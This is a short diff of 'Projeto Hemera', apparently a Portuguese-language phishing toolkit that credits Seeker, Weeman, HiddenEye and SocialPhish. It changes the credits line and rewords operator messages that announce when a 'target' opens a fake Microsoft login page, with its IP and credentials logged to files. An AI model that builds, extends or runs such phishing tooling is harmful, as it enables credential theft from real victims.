@@ -5,7 +5,7 @@
 # .:. Projeto Hemera .:.                                                    #
 # .:. GitHub: https://github.com/Diego333-ms .:.                            #
 # .:. Leia o arquivo LICENSE .:.                                            #
-# .:. Créditos: Seeker,Weeman,HiddenEye .:.                                 #
+# .:. Créditos: Seeker,Weeman,HiddenEye,SocialPhish .:.                     #
 # .:. Desenvolvedor: Diego .:.                                              #
 #                                                                           #
 # Hemera is distributed in the hope that it will be useful,                 #
@@ -1363,8 +1363,8 @@ include 'ip.php';
                verificar_network = os.path.exists("templates/microsoft/ip.txt")
                verificar_credenciais = os.path.exists("templates/microsoft/usernames.txt")
                if (verificar_network == True):
-                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
-                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
+                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
+                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do alvo no Phishing:", hora_atual)
                  os.system("mv templates/microsoft/ip.txt templates/microsoft/ip_log.txt > /dev/null 2>&1")
                  time.sleep(1)
                  continue
